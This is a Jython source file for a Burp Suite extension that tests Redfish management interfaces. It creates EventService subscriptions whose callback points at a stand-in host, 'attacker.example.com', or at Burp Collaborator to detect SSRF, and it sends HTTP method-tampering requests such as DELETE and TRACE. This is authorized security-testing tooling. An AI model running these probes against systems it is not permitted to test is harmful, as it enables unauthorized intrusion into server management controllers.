# -*- coding: utf-8 -*-
"""
SSRFTab — SSRF / EventService subscription tester + HTTP Method Tampering.

Features:
  1. EventService SSRF — POST a subscription pointing to an attacker-controlled
     callback URL (manual or Burp Collaborator if available).
  2. Burp Collaborator polling — list interactions received by the Collaborator
     payload after sending the subscription.
  3. HTTP Method Tampering — fire HEAD/OPTIONS/TRACE/DELETE/PUT/PATCH against
     any URL and surface unexpected 2xx/3xx responses.
"""

import json
import ssl
import urllib2

from java.lang import Thread, Runnable
from javax.swing import (
    JPanel, JLabel, JTextField, JButton, JComboBox,
    JTextArea, JScrollPane, JTable, JSplitPane, JTabbedPane,
    BorderFactory, SwingUtilities, JCheckBox,
)
from javax.swing.table import DefaultTableModel
from java.awt import BorderLayout, FlowLayout, Color, Font

_MONO   = Font('Monospaced', Font.PLAIN, 12)
_ORANGE = Color(230, 100, 0)
_GREEN  = Color(50,  150, 50)
_RED    = Color(200, 50,  50)
_GRAY   = Color(100, 100, 100)

_METHOD_COLS  = ['Method', 'Status', 'Response Length', 'Unexpected?', 'Headers Snippet']
_COLLAB_COLS  = ['Time', 'Type', 'Client IP', 'Detail']


def _style(btn):
    btn.setBackground(_ORANGE)
    btn.setForeground(Color.WHITE)
    btn.setOpaque(True)
    btn.setBorderPainted(False)
    return btn


class _SimpleModel(DefaultTableModel):
    def __init__(self, cols):
        DefaultTableModel.__init__(self, cols, 0)

    def isCellEditable(self, r, c):
        return False


class SSRFTab(object):

    def __init__(self, auth_handler, callbacks):
        self._auth      = auth_handler
        self._callbacks = callbacks
        self._collab    = None   # Burp Collaborator context (if available)
        self._panel     = self._build_ui()

    def get_panel(self):
        return self._panel

    # ------------------------------------------------------------------
    # UI
    # ------------------------------------------------------------------

    def _build_ui(self):
        tabs = JTabbedPane()
        tabs.addTab('EventService SSRF', self._build_ssrf_panel())
        tabs.addTab('HTTP Method Tampering', self._build_method_panel())
        return tabs

    # ── EventService SSRF ─────────────────────────────────────────────

    def _build_ssrf_panel(self):
        from javax.swing import BoxLayout
        panel = JPanel(BorderLayout(4, 4))
        panel.setBorder(BorderFactory.createEmptyBorder(6, 6, 6, 6))

        toolbar = JPanel()
        toolbar.setLayout(BoxLayout(toolbar, BoxLayout.Y_AXIS))

        row1 = JPanel(FlowLayout(FlowLayout.LEFT, 6, 2))
        row1.add(JLabel('EventService Subscriptions URL:'))
        self._fld_sub_url = JTextField(44)
        row1.add(self._fld_sub_url)
        btn_fill = _style(JButton('Fill from Config'))
        btn_fill.addActionListener(lambda e: self._fill_sub_url())
        row1.add(btn_fill)
        toolbar.add(row1)

        row2 = JPanel(FlowLayout(FlowLayout.LEFT, 6, 2))
        row2.add(JLabel('Callback URL:'))
        self._fld_callback = JTextField(36)
        self._fld_callback.setText('http://attacker.example.com/callback')
        row2.add(self._fld_callback)

        self._btn_collab = _style(JButton('Use Burp Collaborator'))
        self._btn_collab.addActionListener(lambda e: self._use_collaborator())
        row2.add(self._btn_collab)
        toolbar.add(row2)

        row3 = JPanel(FlowLayout(FlowLayout.LEFT, 6, 2))
        row3.add(JLabel('Event Types:'))
        self._fld_event_types = JTextField('Alert', 20)
        row3.add(self._fld_event_types)
        row3.add(JLabel('Context:'))
        self._fld_context = JTextField('ssrf-test', 14)
        row3.add(self._fld_context)

        self._btn_send_sub = _style(JButton('Send Subscription'))
        self._btn_send_sub.addActionListener(lambda e: self._on_send_subscription())
        row3.add(self._btn_send_sub)
        self._lbl_ssrf_status = JLabel('')
        self._lbl_ssrf_status.setForeground(_GRAY)
        row3.add(self._lbl_ssrf_status)
        toolbar.add(row3)

        panel.add(toolbar, BorderLayout.NORTH)

        # preview + response
        self._txt_sub_body = JTextArea(6, 0)
        self._txt_sub_body.setFont(_MONO)
        body_scroll = JScrollPane(self._txt_sub_body)
        body_scroll.setBorder(BorderFactory.createTitledBorder('Generated subscription body'))

        self._txt_sub_resp = JTextArea()
        self._txt_sub_resp.setFont(_MONO)
        self._txt_sub_resp.setEditable(False)
        resp_scroll = JScrollPane(self._txt_sub_resp)
        resp_scroll.setBorder(BorderFactory.createTitledBorder('Response'))

        # Collaborator interactions table
        self._collab_model = _SimpleModel(_COLLAB_COLS)
        self._collab_table = JTable(self._collab_model)
        self._collab_table.setFont(_MONO)
        for i, w in enumerate([140, 60, 140, 400]):
            self._collab_table.getColumnModel().getColumn(i).setPreferredWidth(w)

        btn_poll = _style(JButton('Poll Collaborator'))
        btn_poll.addActionListener(lambda e: self._poll_collaborator())
        poll_bar = JPanel(FlowLayout(FlowLayout.LEFT))
        poll_bar.add(btn_poll)
        self._lbl_poll_status = JLabel('(Collaborator not initialised)')
        self._lbl_poll_status.setForeground(_GRAY)
        poll_bar.add(self._lbl_poll_status)

        collab_panel = JPanel(BorderLayout())
        collab_panel.setBorder(BorderFactory.createTitledBorder('Burp Collaborator Interactions'))
        collab_panel.add(poll_bar, BorderLayout.NORTH)
        collab_panel.add(JScrollPane(self._collab_table), BorderLayout.CENTER)

        split1 = JSplitPane(JSplitPane.VERTICAL_SPLIT, body_scroll, resp_scroll)
        split1.setResizeWeight(0.4)
        split2 = JSplitPane(JSplitPane.VERTICAL_SPLIT, split1, collab_panel)
        split2.setResizeWeight(0.55)

        panel.add(split2, BorderLayout.CENTER)
        self._refresh_sub_body()
        return panel

    # ── HTTP Method Tampering ─────────────────────────────────────────

    def _build_method_panel(self):
        from javax.swing import BoxLayout
        panel = JPanel(BorderLayout(4, 4))
        panel.setBorder(BorderFactory.createEmptyBorder(6, 6, 6, 6))

        toolbar = JPanel()
        toolbar.setLayout(BoxLayout(toolbar, BoxLayout.Y_AXIS))

        row1 = JPanel(FlowLayout(FlowLayout.LEFT, 6, 2))
        row1.add(JLabel('Target URL:'))
        self._fld_method_url = JTextField(44)
        row1.add(self._fld_method_url)
        toolbar.add(row1)

        row2 = JPanel(FlowLayout(FlowLayout.LEFT, 6, 2))
        row2.add(JLabel('Methods to test:'))
        self._chk_methods = {}
        for m in ['HEAD', 'OPTIONS', 'TRACE', 'DELETE', 'PUT', 'PATCH', 'GET']:
            chk = JCheckBox(m, m in ('HEAD', 'OPTIONS', 'TRACE', 'DELETE'))
            self._chk_methods[m] = chk
            row2.add(chk)
        toolbar.add(row2)

        row3 = JPanel(FlowLayout(FlowLayout.LEFT, 6, 2))
        self._btn_tamper = _style(JButton('Test Methods'))
        self._btn_tamper.addActionListener(lambda e: self._on_tamper())
        row3.add(self._btn_tamper)
        self._lbl_tamper_status = JLabel('')
        self._lbl_tamper_status.setForeground(_GRAY)
        row3.add(self._lbl_tamper_status)
        toolbar.add(row3)

        panel.add(toolbar, BorderLayout.NORTH)

        self._method_model = _SimpleModel(_METHOD_COLS)
        self._method_table = JTable(self._method_model)
        self._method_table.setFont(_MONO)
        for i, w in enumerate([70, 60, 120, 90, 400]):
            self._method_table.getColumnModel().getColumn(i).setPreferredWidth(w)

        self._txt_method_resp = JTextArea()
        self._txt_method_resp.setFont(_MONO)
        self._txt_method_resp.setEditable(False)

        self._method_raw = {}
        def _on_sel(e):
            if e.getValueIsAdjusting():
                return
            r = self._method_table.getSelectedRow()
            if r >= 0:
                self._txt_method_resp.setText(self._method_raw.get(r, ''))
                self._txt_method_resp.setCaretPosition(0)
        self._method_table.getSelectionModel().addListSelectionListener(_on_sel)

        split = JSplitPane(JSplitPane.VERTICAL_SPLIT,
                           JScrollPane(self._method_table),
                           JScrollPane(self._txt_method_resp))
        split.setResizeWeight(0.6)
        panel.add(split, BorderLayout.CENTER)
        return panel

    # ------------------------------------------------------------------
    # Actions — SSRF
    # ------------------------------------------------------------------

    def _fill_sub_url(self):
        h = self._auth._host
        p = self._auth._port
        s = 'https' if self._auth._use_https else 'http'
        self._fld_sub_url.setText(
            '{0}://{1}:{2}/redfish/v1/EventService/Subscriptions'.format(s, h, p)
        )

    def _refresh_sub_body(self, *_):
        callback   = self._fld_callback.getText().strip() or 'http://attacker.example.com/callback'
        evt_types  = [t.strip() for t in self._fld_event_types.getText().split(',') if t.strip()]
        context    = self._fld_context.getText().strip() or 'ssrf-test'
        body = {
            'Destination': callback,
            'EventTypes':  evt_types or ['Alert'],
            'Context':     context,
            'Protocol':    'Redfish',
        }
        self._txt_sub_body.setText(json.dumps(body, indent=2))

    def _use_collaborator(self):
        try:
            self._collab = self._callbacks.createBurpCollaboratorClientContext()
            payload_url  = 'http://' + self._collab.generatePayload(True)
            self._fld_callback.setText(payload_url)
            self._refresh_sub_body()
            self._lbl_poll_status.setText('Collaborator ready — send subscription then poll.')
            self._lbl_poll_status.setForeground(_GREEN)
        except Exception as ex:
            self._lbl_poll_status.setText('Collaborator unavailable: ' + str(ex))
            self._lbl_poll_status.setForeground(_RED)

    def _on_send_subscription(self):
        self._refresh_sub_body()
        url   = self._fld_sub_url.getText().strip()
        body  = self._txt_sub_body.getText()
        token = self._auth._token
        verify = self._auth._verify_tls

        if not url:
            self._fill_sub_url()
            url = self._fld_sub_url.getText().strip()

        self._lbl_ssrf_status.setForeground(_GRAY)
        self._lbl_ssrf_status.setText('Sending...')
        self._txt_sub_resp.setText('')

        def work():
            return _raw_request('POST', url, body, token, verify)

        def done(res):
            status = res.get('status')
            resp_body = res.get('body', '')
            self._txt_sub_resp.setText(
                'HTTP {0}\n\n{1}'.format(status or 'ERR', resp_body)
            )
            self._txt_sub_resp.setCaretPosition(0)
            if status and 200 <= status < 300:
                self._lbl_ssrf_status.setForeground(_GREEN)
                self._lbl_ssrf_status.setText('Subscription created (HTTP {0}).'.format(status))
            else:
                self._lbl_ssrf_status.setForeground(_RED)
                self._lbl_ssrf_status.setText('Failed (HTTP {0}).'.format(status or 'ERR'))

        _run_bg(work, done)

    def _poll_collaborator(self):
        if not self._collab:
            self._lbl_poll_status.setText('Initialise Collaborator first.')
            self._lbl_poll_status.setForeground(_RED)
            return
        try:
            interactions = self._collab.fetchAllCollaboratorInteractions()
            self._collab_model.setRowCount(0)
            if not interactions:
                self._lbl_poll_status.setText('No interactions yet.')
                self._lbl_poll_status.setForeground(_GRAY)
                return
            for i in interactions:
                t    = str(i.getProperty('time_stamp') or '')
                typ  = str(i.getProperty('type')       or '')
                ip   = str(i.getProperty('client_ip')  or '')
                data = str(i.getProperty('data')       or '')[:200]
                self._collab_model.addRow([t, typ, ip, data])
            self._lbl_poll_status.setText('{0} interaction(s).'.format(len(interactions)))
            self._lbl_poll_status.setForeground(_GREEN)
        except Exception as ex:
            self._lbl_poll_status.setText('Poll error: ' + str(ex))
            self._lbl_poll_status.setForeground(_RED)

    # ------------------------------------------------------------------
    # Actions — Method Tampering
    # ------------------------------------------------------------------

    def _on_tamper(self):
        url    = self._fld_method_url.getText().strip()
        token  = self._auth._token
        verify = self._auth._verify_tls
        methods = [m for m, chk in self._chk_methods.items() if chk.isSelected()]

        if not url:
            self._lbl_tamper_status.setText('Enter a URL.')
            self._lbl_tamper_status.setForeground(_RED)
            return
        if not methods:
            self._lbl_tamper_status.setText('Select at least one method.')
            self._lbl_tamper_status.setForeground(_RED)
            return

        self._method_model.setRowCount(0)
        self._method_raw.clear()
        self._txt_method_resp.setText('')
        self._lbl_tamper_status.setForeground(_GRAY)
        self._lbl_tamper_status.setText('Testing...')
        self._btn_tamper.setEnabled(False)

        add_row = self._add_method_row

        def work():
            for method in methods:
                res = _raw_request(method, url, '', token, verify)
                add_row(method, res)
            def finish():
                self._btn_tamper.setEnabled(True)
                self._lbl_tamper_status.setForeground(_GREEN)
                self._lbl_tamper_status.setText('Done.')
            SwingUtilities.invokeLater(finish)

        class _W(Runnable):
            def run(self_w): work()
        Thread(_W()).start()

    def _add_method_row(self, method, res):
        status   = res.get('status')
        body     = res.get('body', '')
        hdrs     = res.get('headers', '')
        length   = str(len(body))
        snippet  = hdrs[:120].replace('\n', ' ') if hdrs else ''
        # "unexpected" = anything other than 405 Method Not Allowed or 501 Not Implemented
        unexpected = 'YES !' if (status and status not in (405, 501, 404)) else 'no'
        row = [method, str(status) if status else 'ERR', length, unexpected, snippet]

        def update(r=row, b='{0}\n\n{1}'.format(hdrs, body)):
            idx = self._method_model.getRowCount()
            self._method_model.addRow(r)
            self._method_raw[idx] = b
        SwingUtilities.invokeLater(update)


# ------------------------------------------------------------------
# Helpers
# ------------------------------------------------------------------

def _raw_request(method, url, body, token, verify_tls):
    try:
        ctx = ssl.create_default_context()
        if not verify_tls:
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
        data = body.encode('utf-8') if body and method in ('POST', 'PATCH', 'PUT') else None
        req  = urllib2.Request(url, data=data)
        req.get_method = lambda m=method: m
        req.add_header('Accept', 'application/json')
        if data:
            req.add_header('Content-Type', 'application/json')
        if token:
            req.add_header('X-Auth-Token', token)
        resp   = urllib2.urlopen(req, context=ctx, timeout=15)
        status = resp.getcode()
        hdrs   = str(resp.info())
        raw    = resp.read()
        try:
            raw = json.dumps(json.loads(raw), indent=2)
        except Exception:
            pass
        return {'status': status, 'headers': hdrs, 'body': raw}
    except urllib2.HTTPError as e:
        try:
            raw = e.read()
        except Exception:
            raw = ''
        return {'status': e.code, 'headers': str(e.info() or ''), 'body': raw}
    except Exception as ex:
        return {'status': None, 'headers': '', 'body': str(ex)}


def _run_bg(work_fn, done_fn):
    class _W(Runnable):
        def run(self_w):
            result = work_fn()
            class _U(Runnable):
                def run(self_u): done_fn(result)
            SwingUtilities.invokeLater(_U())
    Thread(_W()).start()
